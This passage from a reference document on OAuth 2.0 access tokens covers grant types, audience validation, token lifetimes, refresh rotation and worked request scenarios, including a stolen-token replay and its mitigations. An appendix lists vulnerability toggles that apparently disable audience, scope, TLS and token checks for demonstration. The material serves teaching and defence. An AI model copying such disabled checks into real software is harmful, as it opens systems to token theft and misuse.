- Long-lived refresh token (30-90 days)

**See:** `authorization-code-flow-with-pkce.md`

### 11.2 Client Credentials Flow

**Issuance:** Token endpoint response with client credentials.

**Token Response:**
```http
POST /token HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Authorization: Basic czZCaGRSa3F0MzpnWDFmQmF0M2JW

grant_type=client_credentials
&scope=api:read api:write

Response:
HTTP/1.1 200 OK
Content-Type: application/json
Cache-Control: no-store

{
  "access_token": "2YotnFZFEjr1zCsicMWpAA",
  "token_type": "Bearer",
  "expires_in": 3600,
  "scope": "api:read api:write"
}
```

**Characteristics:**
- **MUST NOT** include refresh_token (RFC 6749 §4.4.3)
- No user context (machine-to-machine)
- Longer-lived than user tokens (but still minutes-hours, not days)
- No refresh token (must re-authenticate with client credentials)

**Why no refresh token?**
- Client can always re-authenticate with client_secret
- Refresh token adds no value (same credentials required)
- Reduces token surface area

**See:** `client-credentials-flow.md`

### 11.3 Refresh Token Flow

**Issuance:** Token endpoint response with refresh token.

**Token Response:**
```http
POST /token HTTP/1.1
Content-Type: application/x-www-form-urlencoded

grant_type=refresh_token
&refresh_token=tGzv3JOkF0XG5Qx2TlKWIA
&scope=read:messages

Response:
HTTP/1.1 200 OK
Content-Type: application/json
Cache-Control: no-store

{
  "access_token": "SlAV32hkKG",              ← New access token
  "token_type": "Bearer",
  "expires_in": 3600,
  "refresh_token": "8xLOxBtZp8",             ← New refresh token (rotation)
  "scope": "read:messages"
}
```

**Characteristics:**
- Issues new access token
- May issue new refresh token (rotation recommended)
- Scope may be reduced (not expanded)
- Old refresh token invalidated (if rotation enabled)

**See:** `refresh-token-flow.md`

### 11.4 Device Authorization Flow

**Issuance:** Token endpoint response after user approves device.

**Token Response:**
```http
POST /token HTTP/1.1
Content-Type: application/x-www-form-urlencoded

grant_type=urn:ietf:params:oauth:grant-type:device_code
&device_code=GmRhmhcxhwAzkoEqiMEg_DnyEysNkuNhszIySk9eS
&client_id=client_abc123

Response:
HTTP/1.1 200 OK
Content-Type: application/json
Cache-Control: no-store

{
  "access_token": "2YotnFZFEjr1zCsicMWpAA",
  "token_type": "Bearer",
  "expires_in": 3600,
  "refresh_token": "tGzv3JOkF0XG5Qx2TlKWIA",   ← Typically included
  "scope": "profile email"
}
```

**Characteristics:**
- Issued after user completes authorization on separate device
- Typically includes refresh token
- Same token characteristics as authorization code flow

**See:** `device-authorization-flow.md`

### 11.5 Implicit Flow (Deprecated)

**Issuance:** Authorization response (URL fragment).

**Authorization Response:**
```http
HTTP/1.1 302 Found
Location: https://client.example.com/callback#
          access_token=2YotnFZFEjr1zCsicMWpAA
          &token_type=Bearer
          &expires_in=3600
          &state=xyz
```

**Characteristics:**
- Issued in authorization response (not token endpoint)
- **MUST NOT** include refresh_token
- Token exposed in browser history/logs
- **DEPRECATED** - Do not use

**See:** `[DEPRECATED] implicit-flow.md`

### 11.6 Grant Type Comparison

| Grant Type | Includes Access Token? | Includes Refresh Token? | Token Endpoint Used? | Spec Reference |
|------------|----------------------|------------------------|---------------------|----------------|
| Authorization Code | ✅ Yes | ✅ Yes (typically) | ✅ Yes | RFC 6749 §4.1.4 |
| Client Credentials | ✅ Yes | ❌ No (MUST NOT) | ✅ Yes | RFC 6749 §4.4.3 |
| Refresh Token | ✅ Yes (new) | ✅ Yes (new, rotation) | ✅ Yes | RFC 6749 §6 |
| Device Authorization | ✅ Yes | ✅ Yes (typically) | ✅ Yes | RFC 8628 §3.5 |
| Implicit (deprecated) | ✅ Yes | ❌ No | ❌ No | RFC 6749 §4.2.2 |

---

## 12. Token Audience (aud claim)

The audience claim defines the intended recipient(s) of the token. This prevents token misuse at unintended resource servers.

### 12.1 Purpose of Audience Claim

**Problem without audience:**
```
Token issued for Email API: https://email.example.com
Attacker steals token
Attacker uses at Calendar API: https://calendar.example.com
Calendar API accepts token (no audience check)
Result: Token works at wrong API ✅ ← Bad
```

**Solution with audience:**
```
Token aud claim: "https://email.example.com"
Attacker steals token
Attacker uses at Calendar API: https://calendar.example.com
Calendar API checks aud: "https://email.example.com" != "https://calendar.example.com"
Result: Token rejected ✅ ← Good
```

### 12.2 Audience in JWT Tokens (RFC 7519 §4.1.3)

**JWT Claim:**
```json
{
  "iss": "https://auth.example.com",
  "sub": "user_123",
  "aud": "https://api.example.com",      ← Single audience
  "exp": 1733432000,
  "scope": "read:messages"
}
```

**Or multiple audiences:**
```json
{
  "iss": "https://auth.example.com",
  "sub": "user_123",
  "aud": [                                ← Array of audiences
    "https://api.example.com",
    "https://api2.example.com"
  ],
  "exp": 1733432000,
  "scope": "read:messages"
}
```

### 12.3 Audience Validation Requirements

**Resource Server SHOULD validate audience (RFC 7519 §4.1.3):**

| Validation Step | Requirement | Spec Reference |
|----------------|-------------|----------------|
| Extract aud claim | REQUIRED | RFC 7519 §4.1.3 |
| Compare to expected value | REQUIRED | RFC 7519 §4.1.3 |
| Reject if mismatch | REQUIRED | RFC 7519 §4.1.3 |
| Support array values | SHOULD | RFC 7519 §4.1.3 |

**Validation Algorithm:**
```
FUNCTION validateAudience(token, expectedAudience):
    # Extract aud claim
    aud = token.aud
    
    IF aud is NULL:
        # Some implementations omit aud for backward compatibility
        # Decision: Accept or Reject based on policy
        IF strictMode:
            RETURN error(401, "invalid_token", "Missing aud claim")
        ELSE:
            RETURN valid  # Allow missing aud (not recommended)
    
    # Handle string or array
    IF aud is String:
        IF aud != expectedAudience:
            RETURN error(401, "invalid_token", "Invalid audience")
    ELSE IF aud is Array:
        IF expectedAudience NOT IN aud:
            RETURN error(401, "invalid_token", "Invalid audience")
    ELSE:
        RETURN error(401, "invalid_token", "Invalid aud claim format")
    
    RETURN valid
```

### 12.4 Audience Values

**Recommended formats:**

| Format | Example | Use Case |
|--------|---------|----------|
| **HTTPS URL** | `https://api.example.com` | Most common, identifies resource server |
| **API identifier** | `https://api.example.com/v1` | Specific API version |
| **URN** | `urn:example:api` | Alternative identifier format |
| **Custom string** | `example-api` | Application-specific |

**Best Practices:**
1. Use consistent, predictable values
2. Document expected audience for each API
3. Use HTTPS URLs where possible (clear, unambiguous)
4. Avoid dynamic/user-controlled audience values

### 12.5 Multiple Audiences

**Use Case:** Token valid at multiple resource servers.

**Example:**
```json
{
  "iss": "https://auth.example.com",
  "aud": [
    "https://email.example.com",
    "https://calendar.example.com",
    "https://contacts.example.com"
  ],
  "scope": "profile email calendar",
  "exp": 1733432000
}
```

**Validation:**
```
Email API expects: "https://email.example.com"
Email API validates: "https://email.example.com" IN aud array
Result: ✅ Valid

Calendar API expects: "https://calendar.example.com"
Calendar API validates: "https://calendar.example.com" IN aud array
Result: ✅ Valid

Malicious API expects: "https://malicious.com"
Malicious API validates: "https://malicious.com" IN aud array
Result: ❌ Invalid (not in array)
```

**Security Consideration:**
- Multiple audiences increase attack surface
- Each audience can potentially use token
- Prefer single audience per token when possible
- Use scope to limit permissions within each audience

### 12.6 Audience in Opaque Tokens

For opaque tokens, audience information is returned in introspection response:

**Introspection Response:**
```json
{
  "active": true,
  "scope": "read:messages",
  "aud": "https://api.example.com",    ← Audience claim
  "exp": 1733432000,
  "iat": 1733428400
}
```

**Resource server validates same way as JWT aud claim.**

---

## 13. Token Lifetime Recommendations

Token lifetime is a critical security parameter: too short annoys users, too long enables attackers.

### 13.1 Access Token Lifetime Guidelines

**General Recommendations:**

| Risk Level | Lifetime | Rationale |
|-----------|----------|-----------|
| **Critical/Financial** | 5-15 minutes | Minimize theft impact |
| **High-security** | 15-30 minutes | Balance security vs refresh frequency |
| **Standard applications** | 30-60 minutes | Common choice |
| **Low-risk public data** | 1-2 hours | Reduce refresh overhead |
| **Never** | >24 hours | Defeats purpose of short-lived tokens |

**Spec Guidance:**
- RFC 6749 §1.4: Access tokens "have a limited lifetime"
- Security BCP §4.3.1: "Access tokens should have a limited lifetime"
- OAuth 2.1: Recommends short lifetimes but doesn't specify exact values

### 13.2 Lifetime by Client Type

| Client Type | Recommended Lifetime | Refresh Token? | Rationale |
|-------------|---------------------|---------------|-----------|
| **Web application (backend)** | 30-60 minutes | Yes | Refresh token stored securely server-side |
| **SPA (via BFF)** | 15-30 minutes | Yes (server-side) | Backend handles refresh |
| **Native mobile app** | 30-60 minutes | Yes | OS secure storage + refresh rotation |
| **Desktop app** | 30-60 minutes | Yes | Secure OS storage available |
| **Client credentials (M2M)** | 30-60 minutes | No | Re-authenticate with client_secret |

### 13.3 Lifetime Trade-offs

**Short Lifetime (5-15 minutes):**

| Advantage | Disadvantage |
|-----------|--------------|
| ✅ Minimal theft impact | ❌ More frequent refreshes |
| ✅ Forces regular revocation checks | ❌ Higher AS load |
| ✅ Enables rotation | ❌ More complex error handling |
| ✅ Better for high-security | ❌ Potential UX friction |

**Long Lifetime (1-24 hours):**

| Advantage | Disadvantage |
|-----------|--------------|
| ✅ Fewer refreshes | ❌ Extended theft window |
| ✅ Lower AS load | ❌ Revocation ineffective |
| ✅ Simpler client code | ❌ Rotation impossible |
| ✅ Better UX (fewer interruptions) | ❌ Poor security posture |

### 13.4 Dynamic Token Lifetime (Adaptive Authentication)

**Concept:** Adjust token lifetime based on risk factors.

**Risk Factors:**

| Factor | Low Risk | High Risk | Token Lifetime |
|--------|----------|-----------|----------------|
| **User device** | Known device, biometric auth | Unknown device | Known: 60 min, Unknown: 15 min |
| **Location** | Expected location | Unusual location | Expected: 60 min, Unusual: 15 min |
| **Operation** | Read-only | Financial transaction | Read: 60 min, Financial: 5 min |
| **IP reputation** | Clean IP | Suspicious IP | Clean: 60 min, Suspicious: 5 min |
| **Time of day** | Normal hours | Unusual hours | Normal: 60 min, Unusual: 15 min |

**Example Dynamic Lifetime Logic:**
```
FUNCTION determineTokenLifetime(context):
    baseLifetime = 3600  # 60 minutes
    
    IF context.operation == "financial_transaction":
        RETURN 300  # 5 minutes for high-risk operations
    
    riskScore = calculateRiskScore(context)
    
    IF riskScore < 30:
        RETURN 3600  # 60 minutes (low risk)
    ELSE IF riskScore < 60:
        RETURN 1800  # 30 minutes (medium risk)
    ELSE:
        RETURN 900   # 15 minutes (high risk)
```

### 13.5 Lifetime Examples by Scenario

**Banking Application:**
```
Login: 60 minute access token
View balance: Same token (read-only)
Transfer money: New token with 5 minute lifetime (high-risk operation)
After transfer: Back to 60 minute tokens
```

**Email Application:**
```
Read emails: 60 minute access token
Send emails: Same token (moderate risk)
Delete all emails: Require re-authentication (destructive operation)
```

**API Service:**
```
Public read endpoints: 2 hour access token (low risk)
Write endpoints: 30 minute access token
Admin endpoints: 15 minute access token
Billing operations: 5 minute access token
```

### 13.6 Relationship Between Access and Refresh Token Lifetimes

| Access Token Lifetime | Refresh Token Lifetime | Ratio | Use Case |
|----------------------|------------------------|-------|----------|
| 15 minutes | 30 days | 1:2,880 | High-security web app |
| 30 minutes | 90 days | 1:4,320 | Standard mobile app |
| 60 minutes | 7 days | 1:168 | Short-lived sessions |
| 5 minutes | 30 days | 1:8,640 | Financial transactions |

**Principle:** Refresh token lifetime >> access token lifetime

**Why:**
- Access token: Used frequently, short-lived (minimize theft)
- Refresh token: Used rarely, long-lived (avoid re-login)

---

## 14. Relationship with Refresh Tokens

Access tokens and refresh tokens work together like a relay race: the access token sprints for a short burst, then the refresh token takes over to get a new access token for the next leg.

### 14.1 Two-Token Model

**Why two tokens?**

```
Naive approach: Single long-lived token
  - Token theft = access for days/weeks/months
  - Revocation ineffective during lifetime
  - Large attack window

OAuth approach: Short-lived access token + long-lived refresh token
  - Access token theft = limited window (minutes)
  - Refresh token used rarely (lower exposure)
  - Refresh provides revocation checkpoint
```

### 14.2 Token Characteristics Comparison

| Characteristic | Access Token | Refresh Token |
|---------------|-------------|---------------|
| **Lifetime** | Short (5-60 minutes) | Long (30-90 days) |
| **Usage Frequency** | High (every API call) | Low (only when access token expires) |
| **Transmission** | Every resource server request | Only to authorization server |
| **Format** | Opaque or JWT | Typically opaque |
| **Grants** | Resource access | New access token |
| **Revocation** | Ineffective (expires quickly) | Effective (checked on refresh) |
| **Spec Reference** | RFC 6749 §1.4 | RFC 6749 §1.5 |

### 14.3 Access/Refresh Token Flow

```
Client                Authorization Server      Resource Server
  │                            │                       │
  │  (1) Initial Grant         │                       │
  │  (authorization code,      │                       │
  │   client credentials, etc.)│                       │
  ├───────────────────────────►│                       │
  │                            │                       │
  │  (2) Token Response        │                       │
  │  access_token + refresh_token                      │
  │◄────────────────────────────┤                       │
  │  expires_in: 3600          │                       │
  │                            │                       │
  │  (3) Use Access Token      │                       │
  │  (many times)              │                       │
  ├────────────────────────────┼──────────────────────►│
  │  Authorization: Bearer AT  │                       │
  │                            │                       │
  │                            │  ┌─────────────────┐  │
  │                            │  │ Time passes...  │  │
  │                            │  │ Token expires   │  │
  │                            │  └─────────────────┘  │
  │                            │                       │
  │  (4) Expired Access Token  │                       │
  ├────────────────────────────┼──────────────────────►│
  │                            │                       │
  │  (5) 401 Unauthorized      │                       │
  │  error="invalid_token"     │                       │
  │◄────────────────────────────┼───────────────────────┤
  │                            │                       │
  │  (6) Refresh Token Exchange│                       │
  │  grant_type=refresh_token  │                       │
  │  refresh_token=RT          │                       │
  ├───────────────────────────►│                       │
  │                            │                       │
  │  (7) New Token Response    │                       │
  │  access_token (new) +      │                       │
  │  refresh_token (new)       │                       │
  │◄────────────────────────────┤                       │
  │                            │                       │
  │  (8) Retry with New AT     │                       │
  ├────────────────────────────┼──────────────────────►│
  │  Authorization: Bearer AT2 │                       │
  │                            │                       │
  │  (9) Success               │                       │
  │◄────────────────────────────┼───────────────────────┤
  │                            │                       │
  ▼                            ▼                       ▼
```

### 14.4 Why This Model Works

**Minimizes Exposure of Long-Lived Credentials:**
- Access token: Exposed frequently (every API call) → short lifetime
- Refresh token: Exposed rarely (only when refreshing) → can be long-lived

**Example Risk Analysis:**
```
Access token (60 min lifetime):
  - Used: 100 times per hour → 6,000 exposures per day
  - Theft window: 60 minutes
  
Refresh token (30 day lifetime):
  - Used: ~24 times per day (once per hour) → 24 exposures per day
  - Theft window: Potentially 30 days BUT checked against revocation on each use
  
Risk comparison:
  - Access token: High exposure, low impact (60 min window)
  - Refresh token: Low exposure, revocable (checked every refresh)
```

### 14.5 Refresh Token Rotation

**Security Enhancement:** Issue new refresh token on each refresh, invalidate old.

**Without Rotation:**
```
Day 1: Issue refresh_token_1
Day 15: Use refresh_token_1, get new access token
  refresh_token_1 still valid
Day 30: Use refresh_token_1, get new access token
  refresh_token_1 still valid
Day 45: Attacker steals refresh_token_1 (discovered on Day 40)
  Attacker can use stolen token (still valid)
```

**With Rotation:**
```
Day 1: Issue refresh_token_1
Day 15: Use refresh_token_1, get refresh_token_2
  refresh_token_1 invalidated
Day 30: Use refresh_token_2, get refresh_token_3
  refresh_token_2 invalidated
Day 45: Attacker steals refresh_token_1 (stolen on Day 40)
  Attacker cannot use (already invalidated on Day 15)
```

**See:** `refresh-token-flow.md` for complete refresh token specification.

### 14.6 Client Credentials Flow Exception

**Critical:** Client Credentials Flow MUST NOT issue refresh tokens (RFC 6749 §4.4.3)

**Reasoning:**
- Client can always re-authenticate with client_secret
- Refresh token adds no security value
- Simpler token management

**Example:**
```http
POST /token HTTP/1.1
Authorization: Basic <client_credentials>
Content-Type: application/x-www-form-urlencoded

grant_type=client_credentials
&scope=api:read

Response:
{
  "access_token": "2YotnFZFEjr1zCsicMWpAA",
  "token_type": "Bearer",
  "expires_in": 3600
  # NO refresh_token ✅
}
```

**When access token expires:**
```
Client simply re-requests token with client credentials
(Same credentials, same process)
No refresh token needed
```

---

## 15. Example Scenarios

Real-world scenarios demonstrating access token usage, validation, and error handling.

### 15.1 Happy Path: Client Uses Access Token to Call API

**Scenario:** Web application makes authenticated API call.

**Flow:**
```
1. Client has access token from previous authorization
2. Client calls protected resource
3. Resource server validates token
4. Resource server returns data
```

**Request:**
```http
GET /api/v1/user/messages HTTP/1.1
Host: api.example.com
Authorization: Bearer 2YotnFZFEjr1zCsicMWpAA
Accept: application/json
```

**Resource Server Processing:**
```
1. Extract token: "2YotnFZFEjr1zCsicMWpAA"
2. Determine token type: Opaque (no "." characters)
3. Call introspection endpoint
4. Introspection response: active=true, scope includes "read:messages"
5. Validate scope requirement: Endpoint needs "read:messages" ✅
6. Grant access
```

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json
Cache-Control: private, no-store

{
  "messages": [
    {
      "id": "msg_123",
      "subject": "Meeting tomorrow",
      "from": "colleague@example.com",
      "date": "2025-12-05T09:00:00Z"
    }
  ],
  "total": 1
}
```

---

### 15.2 Expired Token: Resource Server Returns 401, Client Refreshes

**Scenario:** Access token expires, client must refresh before retrying.

**Initial Request (with expired token):**
```http
GET /api/v1/user/messages HTTP/1.1
Host: api.example.com
Authorization: Bearer EXPIRED_TOKEN_HERE
```

**Resource Server Processing:**
```
1. Extract token
2. Validate token (JWT):
   - Decode JWT
   - Verify signature: ✅ Valid
   - Check exp claim: 1733428800
   - Current time: 1733429200
   - Expired: YES (current time > exp)
3. Return 401 error
```

**Response:**
```http
HTTP/1.1 401 Unauthorized
WWW-Authenticate: Bearer error="invalid_token",
                         error_description="The access token expired"
Content-Type: application/json

{
  "error": "invalid_token",
  "error_description": "Access token expired at 2025-12-05T10:00:00Z"
}
```

**Client Refresh Flow:**
```http
POST /token HTTP/1.1
Host: auth.example.com
Content-Type: application/x-www-form-urlencoded

grant_type=refresh_token
&refresh_token=tGzv3JOkF0XG5Qx2TlKWIA
&client_id=client_abc123

Response:
HTTP/1.1 200 OK
Content-Type: application/json
Cache-Control: no-store

{
  "access_token": "NEW_ACCESS_TOKEN_HERE",
  "token_type": "Bearer",
  "expires_in": 3600,
  "refresh_token": "NEW_REFRESH_TOKEN_HERE"
}
```

**Client Retries Original Request:**
```http
GET /api/v1/user/messages HTTP/1.1
Host: api.example.com
Authorization: Bearer NEW_ACCESS_TOKEN_HERE

Response:
HTTP/1.1 200 OK
Content-Type: application/json

{
  "messages": [...]
}
```

---

### 15.3 Insufficient Scope: Resource Server Returns 403

**Scenario:** Token valid but lacks required scope.

**Request:**
```http
DELETE /api/v1/user/messages/msg_123 HTTP/1.1
Host: api.example.com
Authorization: Bearer 2YotnFZFEjr1zCsicMWpAA
```

**Resource Server Processing:**
```
1. Extract token: "2YotnFZFEjr1zCsicMWpAA"
2. Validate token:
   - Signature: ✅ Valid
   - Expiration: ✅ Not expired
   - Issuer: ✅ Correct
   - Audience: ✅ Correct
3. Determine required scope: "delete:messages" or "write:messages"
4. Token scope: "read:messages"
5. Scope validation: ❌ FAIL (missing delete/write permission)
```

**Response:**
```http
HTTP/1.1 403 Forbidden
WWW-Authenticate: Bearer error="insufficient_scope",
                         error_description="This endpoint requires 'delete:messages' scope",
                         scope="delete:messages"
Content-Type: application/json

{
  "error": "insufficient_scope",
  "error_description": "Your access token has scope 'read:messages' but this endpoint requires 'delete:messages'",
  "required_scope": "delete:messages"
}
```

**Client Response:**
- Cannot fix by refreshing (refresh won't expand scope)
- Must re-authenticate with proper scope
- Or: Display error to user explaining insufficient permissions

---

### 15.4 Token in Wrong Location: Query Parameter Used

**Scenario:** Client incorrectly sends token in URL query parameter.

**Request:**
```http
GET /api/v1/user/messages?access_token=2YotnFZFEjr1zCsicMWpAA HTTP/1.1
Host: api.example.com
```

**Resource Server Processing (Security-Aware):**
```
1. Check for token in Authorization header: Not found
2. Check for token in query parameter: Found
3. Security policy: Reject tokens in URLs (Security BCP §4.3.2)
4. Return error
```

**Response:**
```http
HTTP/1.1 400 Bad Request
WWW-Authenticate: Bearer error="invalid_request",
                         error_description="Access tokens must be sent in Authorization header, not URL parameters"
Content-Type: application/json

{
  "error": "invalid_request",
  "error_description": "For security reasons, access tokens MUST be sent in the Authorization header. Sending tokens in URL query parameters is prohibited due to logging and referrer leakage risks.",
  "see_also": "https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics#section-4.3.2"
}
```

**Security Implications Logged:**
```
[WARNING] Access token received in URL query parameter
  IP: 192.0.2.1
  Path: /api/v1/user/messages
  Token: 2YotnF... (truncated)
  Security Risk: URL logging, referrer leakage, browser history
  Action: Request rejected
  Recommendation: Client must use Authorization header
```

---

### 15.5 JWT Validation: Resource Server Validates Locally

**Scenario:** Resource server validates JWT access token without network call.

**Request:**
```http
GET /api/v1/user/profile HTTP/1.1
Host: api.example.com
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IjEifQ.eyJpc3MiOiJodHRwczovL2F1dGguZXhhbXBsZS5jb20iLCJzdWIiOiJ1c2VyXzEyMyIsImF1ZCI6Imh0dHBzOi8vYXBpLmV4YW1wbGUuY29tIiwiZXhwIjoxNzMzNDMyMDAwLCJpYXQiOjE3MzM0Mjg0MDAsInNjb3BlIjoicHJvZmlsZSBlbWFpbCJ9.signature
```

**JWT Payload (decoded for reference):**
```json
{
  "iss": "https://auth.example.com",
  "sub": "user_123",
  "aud": "https://api.example.com",
  "exp": 1733432000,
  "iat": 1733428400,
  "scope": "profile email"
}
```

**Resource Server Processing:**
```
1. Extract JWT from Authorization header
2. Decode JWT (base64url decode header + payload)
3. Extract kid from header: "1"
4. Fetch public key from cached JWKS (key ID "1")
5. Verify signature using public key: ✅ Valid
6. Validate claims:
   - exp: 1733432000 (future) ✅
   - iss: "https://auth.example.com" ✅
   - aud: "https://api.example.com" ✅
   - scope: contains "profile" ✅ (endpoint requires "profile")
7. Grant access
```

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "user_id": "user_123",
  "name": "Jane Doe",
  "email": "jane@example.com",
  "email_verified": true
}
```

**Performance Note:**
```
No network call to authorization server ✅
Local validation only (signature + claims)
Latency: <1ms (vs ~50-100ms for introspection call)
```

---

### 15.6 Opaque Token Validation: Introspection Call

**Scenario:** Resource server validates opaque access token via introspection.

**Request:**
```http
GET /api/v1/user/profile HTTP/1.1
Host: api.example.com
Authorization: Bearer 2YotnFZFEjr1zCsicMWpAA
```

**Resource Server Processing:**

**Step 1: Call Introspection Endpoint**
```http
POST /introspect HTTP/1.1
Host: auth.example.com
Content-Type: application/x-www-form-urlencoded
Authorization: Basic <resource_server_credentials>

token=2YotnFZFEjr1zCsicMWpAA
&token_type_hint=access_token
```

**Step 2: Introspection Response**
```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "active": true,
  "scope": "profile email",
  "client_id": "client_abc123",
  "username": "jane@example.com",
  "token_type": "Bearer",
  "exp": 1733432000,
  "iat": 1733428400,
  "sub": "user_123",
  "aud": "https://api.example.com"
}
```

**Step 3: Validate Introspection Response**
```
1. active: true ✅
2. exp: 1733432000 (future) ✅
3. aud: "https://api.example.com" ✅
4. scope: contains "profile" ✅
5. Grant access
```

**Step 4: Return Resource**
```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "user_id": "user_123",
  "name": "Jane Doe",
  "email": "jane@example.com"
}
```

**Performance Note:**
```
Network call required: ~50-100ms latency
Introspection endpoint must be highly available
Consider caching introspection response for 1-5 minutes (with caution)
```

---

### 15.7 Token Theft: Attacker Uses Stolen Token

**Scenario:** Attacker intercepts token and uses before expiration.

**Token Stolen:**
```
Token: 2YotnFZFEjr1zCsicMWpAA
Issued: 2025-12-05 10:00:00
Expires: 2025-12-05 11:00:00
Scope: read:messages write:messages
```

**Legitimate Client Request:**
```http
GET /api/v1/user/messages HTTP/1.1
Host: api.example.com
Authorization: Bearer 2YotnFZFEjr1zCsicMWpAA
User-Agent: MyApp/1.0

Response: 200 OK (normal usage)
```

**Attacker Request (10 minutes later):**
```http
GET /api/v1/user/messages HTTP/1.1
Host: api.example.com
Authorization: Bearer 2YotnFZFEjr1zCsicMWpAA
User-Agent: curl/7.68.0    ← Different user agent

Response: 200 OK (token still valid ✅)
```

**Resource Server Cannot Distinguish:**
```
Both requests:
  - Same token ✅
  - Token signature valid ✅
  - Token not expired ✅
  - Scope sufficient ✅

Resource server has NO WAY to know second request is from attacker
```

**Mitigation Options:**

**1. Short Token Lifetime (Already Applied):**
```
Token expires: 2025-12-05 11:00:00
Attack window: 50 minutes remaining
After expiration: Stolen token useless
```

**2. Anomaly Detection (Advanced):**
```
Legitimate client:
  IP: 203.0.113.1 (California)
  User-Agent: MyApp/1.0
  Request pattern: Consistent

Attacker:
  IP: 198.51.100.5 (Different country)
  User-Agent: curl/7.68.0
  Request pattern: Unusual

Detection system:
  Flag: Suspicious activity
  Action: Require re-authentication or step-up auth
```

**3. Sender-Constraint (DPoP):**
```
Token bound to client's public key
Attacker steals token but NOT private key
Attacker cannot generate valid DPoP proof
Resource server rejects: 401 invalid_token
```

**4. Token Revocation:**
```
User detects suspicious activity
User triggers "log out all sessions"
Authorization server revokes all tokens
Next introspection call: active=false
Attacker's next request: 401 invalid_token
```

---

## Appendix A: RFC Cross-Reference Index

| Topic | RFC 6749 | RFC 6750 | RFC 7519 | Security BCP | OAuth 2.1 |
|-------|----------|----------|----------|--------------|-----------|
| Access token definition | §1.4 | — | — | — | §1.4 |
| Bearer token usage | — | Complete | — | §4.3 | §6.1 |
| Authorization header | — | §2.1 | — | — | — |
| Token lifetime | §5.1 | — | — | §4.3.1 | — |
| Token scopes | §3.3, §7 | — | — | — | — |
| Token validation | §7 | §5.2 | — | — | — |
| Introspection | — | — | — | — | RFC 7662 |
| JWT structure | — | — | §3 | — | — |
| JWT claims (exp, aud, iss) | — | — | §4.1 | — | — |
| Error responses | §5.2 | §3 | — | — | — |
| TLS requirement | §1.6 | §5.1 | — | — | — |
| Token in URL (prohibited) | — | §2.3 | — | §4.3.2 | Removed |
| Token theft | §10.6 | — | — | §4.3 | — |
| Sender-constraint (DPoP) | — | — | — | — | RFC 9449 |
| Sender-constraint (mTLS) | — | — | — | — | RFC 8705 |

---

## Appendix B: Vulnerability Mode Quick Reference

| Toggle | Attack Demonstrated | Spec Violation | Section |
|--------|-------------------|----------------|---------|
| `HTTP_RESOURCE_SERVER` | Network interception (MitM) | RFC 6750 §5.1 | §9.1 |
| `ALLOW_TOKEN_IN_URL` | Token leakage via URL logging/referrer | Security BCP §4.3.2 | §9.2 |
| `LOCALSTORAGE_TOKENS` | Token theft via XSS | Security BCP §4.3.3 | §9.3 |
| `STOLEN_TOKEN` | Token replay attack | — | §9.4 |
| `SKIP_SCOPE_CHECK` | Insufficient scope validation | RFC 6749 §7 | §9.5 |
| `SKIP_AUDIENCE_CHECK` | Token substitution attack | RFC 7519 §4.1.3 | §9.6 |
| `SKIP_TLS_VERIFY` | Certificate validation bypass | RFC 6750 §5.1 | §7.1 |
| `LONG_TOKEN_LIFETIME` | Extended attack window | Security BCP §4.3.1 | §13 |
| `DISABLE_DPOP` | Sender-constraint disabled | RFC 9449 | §10 |
| `SKIP_TOKEN_VALIDATION` | No token validation | RFC 6750 §5.2 | §6 |

---

*Document Version: 1.0.0*
*Last Updated: December 5, 2025*
*Specification References: RFC 6749, RFC 6750, RFC 7519, RFC 7662, RFC 9449, RFC 8705, OAuth 2.1 (draft-ietf-oauth-v2-1-10), Security BCP (draft-ietf-oauth-security-topics-27)*
